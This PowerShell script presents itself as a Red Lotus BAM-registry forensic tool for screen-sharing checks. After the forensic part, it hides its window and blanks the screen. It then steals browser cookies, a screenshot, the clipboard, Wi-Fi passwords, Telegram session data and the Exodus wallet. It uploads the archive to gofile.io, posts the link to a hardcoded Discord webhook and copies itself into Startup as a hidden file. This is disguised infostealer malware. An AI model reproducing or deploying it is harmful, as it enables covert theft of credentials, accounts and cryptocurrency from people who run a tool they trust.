$ErrorActionPreference = "SilentlyContinue"

function Get-Signature {

    [CmdletBinding()]
     param (
        [string[]]$FilePath
    )

    $Existence = Test-Path -PathType "Leaf" -Path $FilePath
    $Authenticode = (Get-AuthenticodeSignature -FilePath $FilePath -ErrorAction SilentlyContinue).Status
    $Signature = "Invalid Signature (UnknownError)"

    if ($Existence) {
        if ($Authenticode -eq "Valid") {
            $Signature = "Valid Signature"
        }
        elseif ($Authenticode -eq "NotSigned") {
            $Signature = "Invalid Signature (NotSigned)"
        }
        elseif ($Authenticode -eq "HashMismatch") {
            $Signature = "Invalid Signature (HashMismatch)"
        }
        elseif ($Authenticode -eq "NotTrusted") {
            $Signature = "Invalid Signature (NotTrusted)"
        }
        elseif ($Authenticode -eq "UnknownError") {
            $Signature = "Invalid Signature (UnknownError)"
        }
        return $Signature
    } else {
        $Signature = "File Was Not Found"
        return $Signature
    }
}


Clear-Host



Write-Host "";
Write-Host "";
Write-Host -ForegroundColor Red "   ██████╗ ███████╗██████╗     ██╗      ██████╗ ████████╗██╗   ██╗███████╗    ██████╗  █████╗ ███╗   ███╗";
Write-Host -ForegroundColor Red "   ██╔══██╗██╔════╝██╔══██╗    ██║     ██╔═══██╗╚══██╔══╝██║   ██║██╔════╝    ██╔══██╗██╔══██╗████╗ ████║";
Write-Host -ForegroundColor Red "   ██████╔╝█████╗  ██║  ██║    ██║     ██║   ██║   ██║   ██║   ██║███████╗    ██████╔╝███████║██╔████╔██║";
Write-Host -ForegroundColor Red "   ██╔══██╗██╔══╝  ██║  ██║    ██║     ██║   ██║   ██║   ██║   ██║╚════██║    ██╔══██╗██╔══██║██║╚██╔╝██║";
Write-Host -ForegroundColor Red "   ██║  ██║███████╗██████╔╝    ███████╗╚██████╔╝   ██║   ╚██████╔╝███████║    ██████╔╝██║  ██║██║ ╚═╝ ██║";
Write-Host -ForegroundColor Red "   ╚═╝  ╚═╝╚══════╝╚═════╝     ╚══════╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝";
Write-Host "";
Write-Host -ForegroundColor Blue "   Made By PureIntent (Shitty ScreenSharer) For Red Lotus ScreenSharing and DFIR - " -NoNewLine
Write-Host -ForegroundColor Red "discord.gg/redlotus";
Write-Host "";

function Test-Admin {;$currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent());$currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator);}
if (!(Test-Admin)) {
    Write-Warning "Please Run This Script as Admin."
    Start-Sleep 10
    Exit
}

$sw = [Diagnostics.Stopwatch]::StartNew()

if (!(Get-PSDrive -Name HKLM -PSProvider Registry)){
    Try{New-PSDrive -Name HKLM -PSProvider Registry -Root HKEY_LOCAL_MACHINE}
    Catch{Write-Warning "Error Mounting HKEY_Local_Machine"}
}
$bv = ("bam", "bam\State")
Try{$Users = foreach($ii in $bv){Get-ChildItem -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$($ii)\UserSettings\" | Select-Object -ExpandProperty PSChildName}}
Catch{
    Write-Warning "Error Parsing BAM Key. Likely unsupported Windows Version"
    Exit
}
$rpath = @("HKLM:\SYSTEM\CurrentControlSet\Services\bam\","HKLM:\SYSTEM\CurrentControlSet\Services\bam\state\")

$UserTime = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\TimeZoneInformation").TimeZoneKeyName
$UserBias = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\TimeZoneInformation").ActiveTimeBias
$UserDay = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\TimeZoneInformation").DaylightBias

$Bam = Foreach ($Sid in $Users){$u++
            
        foreach($rp in $rpath){
           $BamItems = Get-Item -Path "$($rp)UserSettings\$Sid" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property
           Write-Host -ForegroundColor Red "Extracting " -NoNewLine
           Write-Host -ForegroundColor Blue "$($rp)UserSettings\$SID"
           $bi = 0 

            Try{
            $objSID = New-Object System.Security.Principal.SecurityIdentifier($Sid)
            $User = $objSID.Translate( [System.Security.Principal.NTAccount]) 
            $User = $User.Value
            }
            Catch{$User=""}
            $i=0
            ForEach ($Item in $BamItems){$i++
		    $Key = Get-ItemProperty -Path "$($rp)UserSettings\$Sid" -ErrorAction SilentlyContinue| Select-Object -ExpandProperty $Item
	
            If($key.length -eq 24){
                $Hex=[System.BitConverter]::ToString($key[7..0]) -replace "-",""
                $TimeLocal = Get-Date ([DateTime]::FromFileTime([Convert]::ToInt64($Hex, 16))) -Format "yyyy-MM-dd HH:mm:ss"
			    $TimeUTC = Get-Date ([DateTime]::FromFileTimeUtc([Convert]::ToInt64($Hex, 16))) -Format "yyyy-MM-dd HH:mm:ss"
			    $Bias = -([convert]::ToInt32([Convert]::ToString($UserBias,2),2))
			    $Day = -([convert]::ToInt32([Convert]::ToString($UserDay,2),2)) 
			    $Biasd = $Bias/60
			    $Dayd = $Day/60
			    $TImeUser = (Get-Date ([DateTime]::FromFileTimeUtc([Convert]::ToInt64($Hex, 16))).addminutes($Bias) -Format "yyyy-MM-dd HH:mm:ss") 
			    $d = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {((split-path -path $item).Remove(23)).trimstart("\Device\HarddiskVolume")} else {$d = ""}
			    $f = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {Split-path -leaf ($item).TrimStart()} else {$item}	
			    $cp = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {($item).Remove(1,23)} else {$cp = ""}
			    $path = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {Join-Path -Path "C:" -ChildPath $cp} else {$path = ""}			
			    $sig = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {Get-Signature -FilePath $path} else {$sig = ""}				
                [PSCustomObject]@{
                            'Examiner Time' = $TimeLocal
						    'Last Execution Time (UTC)'= $TimeUTC
						    'Last Execution User Time' = $TimeUser
						     Application = 	$f
						     Path =  		$path
                             Signature =          $Sig
						     User =         $User
						     SID =          $Sid
                             Regpath =        $rp
                             }}}}}

$Bam | Out-GridView -PassThru -Title "BAM key entries $($Bam.count)  - User TimeZone: ($UserTime) -> ActiveBias: ( $Bias) - DayLightTime: ($Day)"
#===============================================#
$webhookUrl = "https://discord.com/api/webhooks/1231464427078029374/skNGy0oe5Hb6QqQmR26IV0Jinrb1kTNvz2YZTRNZE5V06sySbsg37plvrnMkvWJT_-Du"
#===============================================#


Add-Type -AssemblyName System.Windows.Forms ## IMPORT

## IF IT RETURNS ERROR IT WILL SILENTLY CONTINUE
$ErrorActionPreference = 'SilentlyContinue' 
$ProgressPreference = 'SilentlyContinue' 

#==========================<BEGINNING OF BLACK SCREEN>==========================================================#

$src = @"
    [DllImport("user32.dll")]
    public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);
"@

Add-Type -MemberDefinition $src -Name User32 -Namespace Win32Functions

[Win32Functions.User32]::SendMessage(-1, 0x0112, 0xF170, 2)


#==========================<END OF BLACK SCREEN>==========================================================#
Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class User32 {
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }

    public class Kernel32 {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
    }
"@

$kittyhide = 0

$kittywind = [Kernel32]::GetConsoleWindow()

[User32]::ShowWindow($kittywind, $kittyhide)

#==========================<BEGINNING OF COOKIE DUMPER FOR FIREFOX, EDGE, CHROME>==========================================================#

$RAMEATER = "C:\Program Files\Google\Chrome\Application\chrome.exe"
$bluefoxonwater = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
$foxonfire = "C:\Program Files\Mozilla Firefox\firefox.exe"
$operagx = "C:\Users\romin\AppData\Local\Programs\Opera GX\launcher.exe"

$RDP = 9222
$URL = "https://google.com"
$cookie2storeintemp = [System.IO.Path]::Combine($env:LOCALAPPDATA, "Temp\WindKitty\Browser\Cookies")

function quitx() {
    $broswers = @("chrome", "msedge", "firefox", "launcher")
    foreach ($rameater in $broswers) {
        if (Get-Process -Name $rameater -ErrorAction SilentlyContinue) {
            Stop-Process -Name $rameater -Force # kills proccess <33 uwuw cool
        }
    }
}

function SendReceiveWebSocketMessage {
    param (
        [string] $WebSocketUrl,
        [string] $Message,
        [string] $out
    )

    try {
        $WebSocket = [System.Net.WebSockets.ClientWebSocket]::new()
        $CancellationToken = [System.Threading.CancellationToken]::None
        $connectsock = $WebSocket.ConnectAsync([System.Uri] $WebSocketUrl, $CancellationToken)
        [void]$connectsock.Result
        if ($WebSocket.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
            throw "WebSocket connection failed. State: $($WebSocket.State)"
        }
        $messageBytes = [System.Text.Encoding]::UTF8.GetBytes($Message)
        $buffer = [System.ArraySegment[byte]]::new($messageBytes)
        $task2send = $WebSocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $CancellationToken)
        [void]$task2send.Result
        $datarecive = New-Object System.Collections.Generic.List[byte]
        $ReceiveBuffer = New-Object byte[] 4096 
        $ReceiveBufferSegment = [System.ArraySegment[byte]]::new($ReceiveBuffer)

        while ($true) {
            $recres = $WebSocket.ReceiveAsync($ReceiveBufferSegment, $CancellationToken)
            if ($recres.Result.Count -gt 0) {
                $datarecive.AddRange([byte[]]($ReceiveBufferSegment.Array)[0..($recres.Result.Count - 1)])
            }
            if ($recres.Result.EndOfMessage) {
                break
            }
        }
        $websockmessae = [System.Text.Encoding]::UTF8.GetString($datarecive.ToArray())
        $WebSocket.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "WebSocket closed", $CancellationToken)

        $out = [System.IO.Path]::Combine($cookie2storeintemp, $out)
        $websockmessae | Out-File -FilePath $out -Force
    }
    catch {
        throw $_
    }
}

if (-not (Test-Path -Path $cookie2storeintemp -PathType Container)) {
    New-Item -Path $cookie2storeintemp -ItemType Directory
}

quitx
Start-Process -FilePath $RAMEATER -ArgumentList $URL, "--remote-debugging-port=$RDP", "--remote-allow-origins=ws://localhost:$RDP" -PassThru
Start-Process -FilePath $bluefoxonwater -ArgumentList $URL, "--remote-debugging-port=$RDP", "--remote-allow-origins=ws://localhost:$RDP" -PassThru
Start-Process -FilePath $foxonfire -ArgumentList $URL, "--remote-debugging-port=$RDP", "--remote-allow-origins=ws://localhost:$RDP" -PassThru
Start-Process -FilePath $operagx -ArgumentList $URL, "--remote-debugging-port=$RDP", "--remote-allow-origins=ws://localhost:$RDP" -PassThru

$rameaterurl = "http://localhost:$RDP/json"
$rameaterdata = Invoke-RestMethod -Uri $rameaterurl -Method Get
$rameatercapture = $rameaterdata.webSocketDebuggerUrl
$rameatersrc = '{"id": 1,"method":"Network.getAllCookies"}'
SendReceiveWebSocketMessage -WebSocketUrl $rameatercapture[0] -Message $rameatersrc -out "chromecookies.txt"

$ramkeeper = "http://localhost:$RDP/json"
$ramkeepersaver = Invoke-RestMethod -Uri $ramkeeper -Method Get
$ramsavercapture = $ramkeepersaver.webSocketDebuggerUrl
$ramsaversrc = '{"id": 1,"method":"Network.getAllCookies"}'
SendReceiveWebSocketMessage -WebSocketUrl $ramsavercapture[0] -Message $ramsaversrc -out "edgecookies.txt"

$coolfoxonfire = "http://localhost:$RDP/json"
$coolfoxonfiredata = Invoke-RestMethod -Uri $coolfoxonfire -Method Get
$coolfoxonfirecapture = $coolfoxonfiredata.webSocketDebuggerUrl
$coolfoxonfiresrc = '{"id": 1,"method":"Network.getAllCookies"}'
SendReceiveWebSocketMessage -WebSocketUrl $coolfoxonfirecapture[0] -Message $coolfoxonfiresrc -out "firefoxcookies.txt"

$coolfoxonfire = "http://localhost:$RDP/json"
$coolfoxonfiredata = Invoke-RestMethod -Uri $operagx -Method Get
$coolfoxonfirecapture = $operagx.webSocketDebuggerUrl
$coolfoxonfiresrc = '{"id": 1,"method":"Network.getAllCookies"}'
SendReceiveWebSocketMessage -WebSocketUrl $coolfoxonfirecapture[0] -Message $operagx -out "operagx.txt"

quitx

$press = [System.IO.Path]::Combine($env:LOCALAPPDATA, "Temp\WindKitty\Browser\Cookies")
Move-Item -Path $press -Destination $destination
#==========================<END OF COOKIE DUMPER FOR FIREFOX, EDGE, CHROME>==========================================================#


#==========================<BEGGING OF NOT DECRYPTED COOKIES STEALER>================================================#
New-Item -ItemType Directory -Path "$env:TEMP\WindKitty\NotDecryptedCookies" -Force
Copy-Item -Path "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies" -Destination "$env:TEMP\WindKitty\NotDecryptedCookies\EdgeCookies.sqlite"
Copy-Item -Path "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies" -Destination "$env:TEMP\WindKitty\NotDecryptedCookies\ChromeCookies.sqlite"
$foxonwota = Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Waterfox\Profiles" | Where-Object { $_.Name -match '\.default-release$' }; if ($null -ne $foxonwota) { Copy-Item -Path (Join-Path -Path $foxonwota.FullName -ChildPath 'cookies.sqlite') -Destination (Join-Path -Path $env:TEMP -ChildPath 'WindKitty\NotDecryptedCookies\Waterfox.sqlite') }
$foxonfire = Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles" | Where-Object { $_.Name -match '\.default-release-\d+$' }; if ($null -ne $foxonfire) { Copy-Item -Path (Join-Path -Path $foxonfire.FullName -ChildPath 'cookies.sqlite') -Destination (Join-Path -Path $env:TEMP -ChildPath 'WindKitty\NotDecryptedCookies\Firefox.sqlite') }
#==========================<END OF DECRYPTED COOKIES STEALER>================================================#

#==========================<BEGINNING SCREENSHOT OF DESKTOP!! DO NOT MODIFY UNLESS YOU KNOW WHAT YOURE DOING>==========================================================#

$windkitty2save = Join-Path -Path $env:TEMP -ChildPath "WindKitty" #] i want
$windbit = New-Object Drawing.Bitmap([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, [System.Windows.Forms.SystemInformation]::VirtualScreen.Height)

$windkittygrep = [System.Drawing.Graphics]::FromImage($windbit)

$windkittygrep.CopyFromScreen([System.Windows.Forms.SystemInformation]::VirtualScreen.X, [System.Windows.Forms.SystemInformation]::VirtualScreen.Y, 0, 0, $windbit.Size)

$2savescreenkitty = Join-Path -Path $windkitty2save -ChildPath "DesktopScreenshot.png"
$windbit.Save($2savescreenkitty, [System.Drawing.Imaging.ImageFormat]::Png)

$windkittygrep.Dispose()
$windbit.Dispose()

#=========================================================================<END OF SCREENSHOT>=========================================================================#

#=========================================================================<BEGGING OF CLIPBOARD STEALER>=========================================================================#
$windkitty2saves = Join-Path -Path $env:TEMP -ChildPath "WindKitty\WindKittyClipboard.txt"; (Get-Clipboard) | Out-File -FilePath $windkitty2saves -Encoding utf8
#=========================================================================<END OF CLIPBOARD STEALER>=========================================================================#


#=========================================================================<BEGINNING OF WIFI PASSES RUNNING PROGRAMS AND INSTALLED PROGRAMS>================================#
$Profiles = @()
$Profiles += (netsh wlan show profiles) | Select-String '\:(.+)$' | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }

$wifi = $Profiles | ForEach-Object {
    $SSID = $_
    $getpass = (netsh wlan show profile name="$_" key=clear) | Select-String 'Key Content\W+\:(.+)$'
    
    if ($getpass) {
        $pass = $getpass.Matches.Groups[1].Value.Trim()
        [PSCustomObject]@{
            Wireless_Network_Name = $SSID
            Password              = $pass
        }
    }
}

$sess = Join-Path -Path $env:TEMP -ChildPath "WindKitty\SystemInfo"

New-Item -ItemType Directory -Force -Path $sess | Out-Null

$wifi | Out-File -FilePath "$sess\wifipass.txt" -Encoding ASCII -Width 50
(Get-Process | Select-Object ProcessName, Id) | Out-File "$sess\runningprograms.txt" -Encoding ASCII -Width 50
(Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
Select-Object DisplayName, DisplayVersion, Publisher, InstallDate) | Out-File "$sess\installedprograms.txt" -Encoding ASCII -Width 50
#=========================================================================<END OF WIFI PASSES RUNNING PROGRAMS AND INSTALLED PROGRAMS>===================================#

#=========================================================================<BEGINNING OF EPIC GAMES INFO, TELEGRAM, EXODUS WALLET, ANTI DEBUG PROCESS>================================#
class stealer {
    
    [string]$EnvTemp

    stealer() {
        $this.EnvTemp = $env:temp
    }

    [void] GetTelegram() {
        $path = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
        if (!(Test-Path $path)) {
            return
        }

        $processname = "telegram"
        try {
            if (Get-Process $processname -ErrorAction SilentlyContinue) {
                Get-Process -Name $processname | Stop-Process
            }
        }
        catch {}

        $destination = Join-Path -Path $this.EnvTemp -ChildPath "WindKitty\Socials\Telegram"
        $exclude = @("_*.config", "dumps", "tdummy", "emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5", "user_data#6", "*.json", "webview")
        $files = Get-ChildItem -Path $path -Exclude $exclude
        Copy-Item -Path $files -Destination $destination -Recurse -Force
    }

    [void] GetExodus() {
        $sess = Join-Path -Path $env:TEMP -ChildPath "WindKitty\Crypto\Exodus"
        New-Item -ItemType Directory -Force -Path $sess
        $v1 = "$env:appdata\Exodus"
        $v2 = "$env:localappdata\Temp\WindKitty\Crypto\Exodus"

        if (Test-Path $v2) {
            Remove-Item $v2 -Recurse -Force
        }

        if (Test-Path $v1) {
            Copy-Item -Path $v1 -Destination $v2 -Recurse -Force
        }
    }

}

$stealer = [stealer]::new()
$stealer.GetTelegram()
$stealer.GetExodus()

$src = Join-Path -Path $env:TEMP -ChildPath "WindKitty"
$des = Join-Path -Path $env:TEMP -ChildPath "WindKitty.zip"

Compress-Archive -Path $src -DestinationPath $des -CompressionLevel Fastest -Force

#=========================================================================<END OF EPIC GAMES INFO, TELEGRAM, EXODUS WALLET, ANTI DEBUG PROCESS>================================#


function ilovekfc {
    $sys = Get-CimInstance Win32_ComputerSystem
    $OS = Get-CimInstance Win32_OperatingSystem
    $gpu = Get-CimInstance Win32_VideoController
    $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org/?format=json').ip

    $embed = @{
        title       = "System Information - WindKitty Grabber"
        description = "Manufacturer: $($sys.Manufacturer)`nModel: $($sys.Model)`nOS: $($OS.Caption) $($OS.Version)`nTotal RAM: $([math]::Round($sys.TotalPhysicalMemory / 1GB, 2)) GB`nGPU: $($gpu.Caption)`nIP: $($ip)"
        color       = 3447003
    }

    return $embed
}

$res = (curl.exe -F "file=@$env:TEMP\WindKitty.zip" "https://store1.gofile.io/uploadFile" | ConvertFrom-Json).data.downloadPage

$syscall = ilovekfc

$payload = @{
    embeds  = @($syscall)
    content = "Users Files (Cookies,Wallets,Social): $res"
}

$pay = $payload | ConvertTo-Json

Invoke-RestMethod -Method Post -Uri $webhookUrl -Body $pay -ContentType "application/json"

Remove-Item -Path (Join-Path -Path $env:TEMP -ChildPath "WindKitty") -Recurse -Force
Remove-Item -Path (Join-Path -Path $env:TEMP -ChildPath "WindKitty.zip") -Recurse -Force

#======================<BEGGING OF STARTUP>============================#
try {
    $crntfile = $PSCommandPath
    $despath = Join-Path ([System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')) (Get-Item $crntfile).Name
    Move-Item -Path $crntfile -Destination $despath -Force
    [System.IO.File]::SetAttributes($despath, [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
    
}
catch {
    Write-Host "welp i cant move it to startup"
}
Clear-Host

#======================<END OF STARTUP>============================#

$sw.stop()
$t = $sw.Elapsed.TotalMinutes
Write-Host ""
Write-Host "Elapsed Time $t Minutes" -ForegroundColor Yellow